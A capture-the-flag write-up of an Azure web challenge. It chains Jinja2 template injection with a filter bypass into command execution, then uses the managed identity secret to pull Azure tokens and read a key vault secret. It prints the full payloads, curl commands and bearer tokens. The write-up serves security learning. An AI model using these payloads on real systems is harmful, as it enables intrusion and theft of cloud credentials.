# Writeup for Azure/Cloud protected web app

```
Say hello to our shiny new web app protected by secure HTTP: flag2webapp [flag2webapp](https://flag2webapp.azurewebsites.net/). The flag can be found as a secret in a key vault.
```

Accessing the flag2webapp at (https://flag2webapp.azurewebsites.net/), we get a prompt asking for our name. After curtiously giving our name, and a couple of other things, we find out that the site has a Server-Side Template Injection (SSTI) vulnerability.

This can easily be tested with the fancy payload: `{{ 7 + 7 }}`, which gives the output `Hello 14`.
We find that we can run many things, but that we get stopped (momentarily) by a filter telling us: 
```
The following chars are not allowed in our payloads: #';&_
```

Luckily for us, there are ways to bypass these kinds of filters (see more at https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti), and we are able to craft a payload giving us RCE on the server.

The following payload (sent as a POST request to flag2webapp.azurewebsites.net/hello) gives us the list of files from the pwd:
```
name={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
```

This gives us the output:
```
Hello  app.py
gunicorn_config.py
requirements.txt
setup_logs.py
static
templates
wsgi.py
```

That is interesting and all, but the juicy bits can be found in the environment: 
Request:
```
name={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("env")["read"]() %} {{ a }} {% endwith %}
```

Response:
```
Hello  APPSETTING_WEBSITE_AUTH_DISABLE_WWWAUTHENTICATE=False
<snip>
IDENTITY_HEADER=5d8e39c0-6596-4236-b1d2-d37047bba06b
<snip>
MSI_ENDPOINT=http://169.254.130.9:8081/msi/token
<snip>
MSI_SECRET=5d8e39c0-6596-4236-b1d2-d37047bba06b
<snip>
IDENTITY_ENDPOINT=http://169.254.130.9:8081/msi/token
<snip>
```

Using the "Managed Services Identity" we can ask for access_tokens!

We'll first ask for an access_token to management.azure.com, as we need more information about the location of the key vault...

In the request, we need to specify headers with the values `Metadata:true` and `secret:5d8e39c0-6596-4236-b1d2-d37047bba06b` (what we got from the previous step). The `Metadata:true` header is necessary to bypass mitigations against server side request forgery (SSRF) :D

Request: 
```
name={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("
curl -H Metadata:true -H secret:5d8e39c0-6596-4236-b1d2-d37047bba06b \x27http://169.254.130.9:8081/msi/token?api-version=2017-09-01\x26resource=https://management.azure.com\x27
")["read"]() %} {{ a }} {% endwith %}
```

Response: 
```
Hello  {&#34;access_token&#34;:&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1LyIsImlhdCI6MTY2Nzk5NTMyNiwibmJmIjoxNjY3OTk1MzI2LCJleHAiOjE2NjgwODIwMjYsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6ImUzNDdhYWJmLTQwY2UtNDBlNS04YjhkLTAyZjEzZjI0NmViZSIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzY4MzdkYjhiLTcyZDktNDM0Ni1iYmI0LWMyNTM2MTUwYWRmNS8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6Ijk4ODM0ZWVhLTg2NDEtNGM1YS1iNGFjLWNlOWZjOTc2ODUzYSIsInJoIjoiMC5BWE1BaTlzM2FObHlSa083dE1KVFlWQ3Q5VVpJZjNrQXV0ZFB1a1Bhd2ZqMk1CTnpBQUEuIiwic3ViIjoiOTg4MzRlZWEtODY0MS00YzVhLWI0YWMtY2U5ZmM5NzY4NTNhIiwidGlkIjoiNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1IiwidXRpIjoiUEFuU3BSOVZHa2FFUTFqaUUxbUJBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FkMTE2ZjExLTkyMWEtNDNhZC04YjgwLTViOGFmOTJlMDgzMy9yZXNvdXJjZWdyb3Vwcy93ZWItcmcvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvZmxhZzJ3ZWJhcHAiLCJ4bXNfdGNkdCI6MTYwMTM2NDg0N30.h06bfv2mrJ5SWv9ZSg6aqd0gmHUU6j4f5aLGFqqnn1mpKPWpOtyaJQxKsaEx8iS4yHn9_oyd_5pdzPnrW82r4zLF_0MAgLMMcm5WoMYBsAPqMP77RNZXtdjekbya28EJD9WHtYkpGF_pTnaQgPVdNtwEClVn0kH7mmWGyXgOahby131w_80L5DMMCgGNJKSlJarWsZjhiu1xvdS_jfNGOC_4rmtgJ4jIwbanHIbHyBxWV2dRHt0qrPl9Ix8RvMfl8-DkMVGwKZMVD-O_AHj0Abb_VIAzI9wh3ZDqmKDTwzj6DTmB1OX1j3clP_lVocT05zZcvvJo2pXawSY4Q4onMQ&#34;,&#34;expires_on&#34;:&#34;11/10/2022 12:07:05 +00:00&#34;,&#34;resource&#34;:&#34;https://management.azure.com&#34;,&#34;token_type&#34;:&#34;Bearer&#34;,&#34;client_id&#34;:&#34;e347aabf-40ce-40e5-8b8d-02f13f246ebe&#34;} 
```
Fantastic! We now have an access_token we can use.

The first thing we will use it for, is finding the location of the key vault. To do this, we first need to know the location of the subscription:
Request:
```
name={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("curl -H \x27Authorization:\x20Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1LyIsImlhdCI6MTY2Nzk5NTMyNiwibmJmIjoxNjY3OTk1MzI2LCJleHAiOjE2NjgwODIwMjYsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6ImUzNDdhYWJmLTQwY2UtNDBlNS04YjhkLTAyZjEzZjI0NmViZSIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzY4MzdkYjhiLTcyZDktNDM0Ni1iYmI0LWMyNTM2MTUwYWRmNS8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6Ijk4ODM0ZWVhLTg2NDEtNGM1YS1iNGFjLWNlOWZjOTc2ODUzYSIsInJoIjoiMC5BWE1BaTlzM2FObHlSa083dE1KVFlWQ3Q5VVpJZjNrQXV0ZFB1a1Bhd2ZqMk1CTnpBQUEuIiwic3ViIjoiOTg4MzRlZWEtODY0MS00YzVhLWI0YWMtY2U5ZmM5NzY4NTNhIiwidGlkIjoiNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1IiwidXRpIjoiUEFuU3BSOVZHa2FFUTFqaUUxbUJBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FkMTE2ZjExLTkyMWEtNDNhZC04YjgwLTViOGFmOTJlMDgzMy9yZXNvdXJjZWdyb3Vwcy93ZWItcmcvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvZmxhZzJ3ZWJhcHAiLCJ4bXNfdGNkdCI6MTYwMTM2NDg0N30.h06bfv2mrJ5SWv9ZSg6aqd0gmHUU6j4f5aLGFqqnn1mpKPWpOtyaJQxKsaEx8iS4yHn9\x5foyd\x5f5pdzPnrW82r4zLF\x5f0MAgLMMcm5WoMYBsAPqMP77RNZXtdjekbya28EJD9WHtYkpGF\x5fpTnaQgPVdNtwEClVn0kH7mmWGyXgOahby131w\x5f80L5DMMCgGNJKSlJarWsZjhiu1xvdS\x5fjfNGOC\x5f4rmtgJ4jIwbanHIbHyBxWV2dRHt0qrPl9Ix8RvMfl8-DkMVGwKZMVD-O\x5fAHj0Abb\x5fVIAzI9wh3ZDqmKDTwzj6DTmB1OX1j3clP\x5flVocT05zZcvvJo2pXawSY4Q4onMQ\x27 \x27https://management.azure.com/subscriptions?api-version=2022-09-01\x27")["read"]() %} {{ a }} {% endwith %}
```
Note that all underscores n the `access_token` have been replaced with the hex value `\x5f`

The response gives us the subscription id `ad116f11-921a-43ad-8b80-5b8af92e0833`, which we can use to go towards the keyvault.
Request:
```
name={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("curl -H \x27Authorization:\x20Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1LyIsImlhdCI6MTY2Nzk5NTMyNiwibmJmIjoxNjY3OTk1MzI2LCJleHAiOjE2NjgwODIwMjYsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6ImUzNDdhYWJmLTQwY2UtNDBlNS04YjhkLTAyZjEzZjI0NmViZSIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzY4MzdkYjhiLTcyZDktNDM0Ni1iYmI0LWMyNTM2MTUwYWRmNS8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6Ijk4ODM0ZWVhLTg2NDEtNGM1YS1iNGFjLWNlOWZjOTc2ODUzYSIsInJoIjoiMC5BWE1BaTlzM2FObHlSa083dE1KVFlWQ3Q5VVpJZjNrQXV0ZFB1a1Bhd2ZqMk1CTnpBQUEuIiwic3ViIjoiOTg4MzRlZWEtODY0MS00YzVhLWI0YWMtY2U5ZmM5NzY4NTNhIiwidGlkIjoiNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1IiwidXRpIjoiUEFuU3BSOVZHa2FFUTFqaUUxbUJBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FkMTE2ZjExLTkyMWEtNDNhZC04YjgwLTViOGFmOTJlMDgzMy9yZXNvdXJjZWdyb3Vwcy93ZWItcmcvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvZmxhZzJ3ZWJhcHAiLCJ4bXNfdGNkdCI6MTYwMTM2NDg0N30.h06bfv2mrJ5SWv9ZSg6aqd0gmHUU6j4f5aLGFqqnn1mpKPWpOtyaJQxKsaEx8iS4yHn9\x5foyd\x5f5pdzPnrW82r4zLF\x5f0MAgLMMcm5WoMYBsAPqMP77RNZXtdjekbya28EJD9WHtYkpGF\x5fpTnaQgPVdNtwEClVn0kH7mmWGyXgOahby131w\x5f80L5DMMCgGNJKSlJarWsZjhiu1xvdS\x5fjfNGOC\x5f4rmtgJ4jIwbanHIbHyBxWV2dRHt0qrPl9Ix8RvMfl8-DkMVGwKZMVD-O\x5fAHj0Abb\x5fVIAzI9wh3ZDqmKDTwzj6DTmB1OX1j3clP\x5flVocT05zZcvvJo2pXawSY4Q4onMQ\x27 \x27https://management.azure.com/subscriptions/ad116f11-921a-43ad-8b80-5b8af92e0833/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01\x27")["read"]() %} {{ a }} {% endwith %}
```

Response:
```
Hello  {&#34;value&#34;:[],&#34;nextLink&#34;:&#34;https://management.azure.com/subscriptions/ad116f11-921a-43ad-8b80-5b8af92e0833/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&amp;$skiptoken=a2V5dmF1bHQxLXJnfGtleXZhdWx0MS0yRDlDN0U1OA==&#34;} 
```
NextLink does sound like something we'd want to follow, and the `$skiptoken` value decodes to `keyvault1-rg|keyvault1-2D9C7E58`, so we craft a GET request to `https://management.azure.com/subscriptions/ad116f11-921a-43ad-8b80-5b8af92e0833/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&amp;$skiptoken=a2V5dmF1bHQxLXJnfGtleXZhdWx0MS0yRDlDN0U1OA==`, containing the access_token as a Bearer token (no need to convert the underscores in this case though). 

The response gives us a new `nextLink`. This time with two `$skiptoken`s:
```json
{"value":[],"nextLink":"https://management.azure.com/subscriptions/ad116f11-921a-43ad-8b80-5b8af92e0833/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&amp;$skiptoken=a2V5dmF1bHQxLXJnfGtleXZhdWx0MS0yRDlDN0U1OA==&$skiptoken=a2V5dmF1bHQxLXJnfGtleXZhdWx0MS0yRDlDN0U1OA=="}
```

No worries.. We follow that link, then the next, then the next, untill we finally get something very different:
```json
{"value":[{"id":"/subscriptions/ad116f11-921a-43ad-8b80-5b8af92e0833/resourceGroups/web-rg/providers/Microsoft.KeyVault/vaults/flag2vault70CF316D","name":"flag2vault70CF316D","type":"Microsoft.KeyVault/vaults","location":"northeurope","tags":{},"systemData":{"createdBy":"admin@eqcdc.onmicrosoft.com","createdByType":"User","createdAt":"2022-10-21T09:40:22.675Z","lastModifiedBy":"admin@eqcdc.onmicrosoft.com","lastModifiedByType":"User","lastModifiedAt":"2022-10-21T09:40:22.675Z"},"properties":{"sku":{"family":"A","name":"standard"},"tenantId":"6837db8b-72d9-4346-bbb4-c2536150adf5","accessPolicies":[{"tenantId":"6837db8b-72d9-4346-bbb4-c2536150adf5","objectId":"616c5922-d987-4ec4-b1f3-113f2b0d1517","permissions":{"keys":["all"],"secrets":["all"],"certificates":["all"],"storage":["all"]}}],"enabledForDeployment":false,"enableSoftDelete":true,"softDeleteRetentionInDays":90,"enableRbacAuthorization":true,"vaultUri":"https://flag2vault70cf316d.vault.azure.net/","provisioningState":"Succeeded","publicNetworkAccess":"Enabled"}}],"nextLink":"https://management.azure.com/subscriptions/ad116f11-921a-43ad-8b80-5b8af92e0833/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&amp;$skiptoken=a2V5dmF1bHQxLXJnfGtleXZhdWx0MS0yRDlDN0U1OA==&$skiptoken=d2ViLXJnfGZsYWcydmF1bHQ3MENGMzE2RA=="}
```

Fantastic! Now we can just do a quick GET request to `flag2vault70cf316d.vault.azure.net//secrets/flag/?api-version=7.3` with our trusty `access_token` and get our sweet, sweet flag!

... or not. Instead we get the 401 error message:
```
{"error":{"code":"Unauthorized","message":"AKV10022: Invalid audience. Expected https://vault.azure.net, found: https://management.azure.com."}}
```

Which isn't really that strange, as this was what we asked for when we were asking the `http://169.254.130.9:8081/msi/token` endpoint. 

Let's get a new token for with the correct audience with a new POST request to (https://flag2webapp.azurewebsites.net/hello).
Request:
```
name={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("curl -H Metadata:true -H secret:5d8e39c0-6596-4236-b1d2-d37047bba06b \x27http://169.254.130.9:8081/msi/token?api-version=2017-09-01\x26resource=https://vault.azure.net\x27")["read"]() %} {{ a }} {% endwith %}
```

We get a new `access_token`:
```
Hello  {&#34;access_token&#34;:&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzY4MzdkYjhiLTcyZDktNDM0Ni1iYmI0LWMyNTM2MTUwYWRmNS8iLCJpYXQiOjE2Njc5OTY1MzMsIm5iZiI6MTY2Nzk5NjUzMywiZXhwIjoxNjY4MDgzMjMzLCJhaW8iOiJFMlpnWU9qK2N5ZXl2ZTZMcmVpMHZxUWwreVlrQUFBPSIsImFwcGlkIjoiZTM0N2FhYmYtNDBjZS00MGU1LThiOGQtMDJmMTNmMjQ2ZWJlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1LyIsIm9pZCI6Ijk4ODM0ZWVhLTg2NDEtNGM1YS1iNGFjLWNlOWZjOTc2ODUzYSIsInJoIjoiMC5BWE1BaTlzM2FObHlSa083dE1KVFlWQ3Q5VG16cU0taWdocEhvOGtQd0w1NlFKTnpBQUEuIiwic3ViIjoiOTg4MzRlZWEtODY0MS00YzVhLWI0YWMtY2U5ZmM5NzY4NTNhIiwidGlkIjoiNjgzN2RiOGItNzJkOS00MzQ2LWJiYjQtYzI1MzYxNTBhZGY1IiwidXRpIjoiNjNSdVctdi14RTYyUTlaU2JUMkZBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FkMTE2ZjExLTkyMWEtNDNhZC04YjgwLTViOGFmOTJlMDgzMy9yZXNvdXJjZWdyb3Vwcy93ZWItcmcvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvZmxhZzJ3ZWJhcHAifQ.Z6RqcxtgYUG5l6Sv8vKlIWScAYTyCuYgcOTVIQuQVnTHOZNH_5KwXZ0fzo3TUjRiMfCnSzbw-5A_vT30yX2E3I6FTMBcn_BLo_1ksVHh9DYRYvLMBs2NOse9G8DV2tVkiYYaijdImVmQUe2aCZfs1fJ_rtPOvSEYyIRXqLVfrX6GuDjlp7q4ZnzVz4tvNBGy27C8yRppouQNEHk7f94smPxmKVCwi40AWE7HGoLi5zdGxUKAEihqm7Mzwiinb7N235LGn3Ks4e0AOerOE0yZdYwYVGl-LWhk06KZbTswh893LfFTXW1Dodnku5rzOpMtUgs6K89EeCbCuWA0vTddgQ&#34;,&#34;expires_on&#34;:&#34;11/10/2022 12:27:13 +00:00&#34;,&#34;resource&#34;:&#34;https://vault.azure.net&#34;,&#34;token_type&#34;:&#34;Bearer&#34;,&#34;client_id&#34;:&#34;e347aabf-40ce-40e5-8b8d-02f13f246ebe&#34;} 
```

Which we send along with our request to GET (flag2vault70cf316d.vault.azure.net//secrets/flag/?api-version=7.3). We are finally awarded our sweet, sweet flag:
```
{"value":"EPT{e3ea68ae-172f-4f31-a4a5-bafd33d89bce}\n","id":"https://flag2vault70cf316d.vault.azure.net/secrets/flag/c69df361b1d340b1aaaaef6ac7b617b4","attributes":{"enabled":true,"created":1666350404,"updated":1666350404,"recoveryLevel":"Recoverable+Purgeable","recoverableDays":90}}
```

Flag: `EPT{e3ea68ae-172f-4f31-a4a5-bafd33d89bce}`